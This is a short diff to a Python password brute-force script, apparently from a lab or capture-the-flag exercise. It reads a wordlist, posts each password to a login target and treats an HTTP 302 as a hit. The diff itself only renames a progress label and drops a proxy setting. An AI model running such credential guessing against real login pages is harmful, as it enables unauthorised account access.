@@ -69,7 +69,7 @@ def brute_force(s, target, correct_username, passwordsfile):
     with open(passwordsfile, "r") as p:
         passwords = p.read().split("\n")
 
-    p2 = log.progress("Validation Password")
+    p2 = log.progress("Validating Password")
     p2.status(f"Iniciando proceso de Validacion de Password")
 
     time.sleep(2)
@@ -82,7 +82,7 @@ def brute_force(s, target, correct_username, passwordsfile):
             "password": "%s" % password
         }
 
-        r = s.post(target, data=post_data, allow_redirects=False, proxies=proxies)
+        r = s.post(target, data=post_data, allow_redirects=False)
 
         if r.status_code == 302:
             correct_password = password
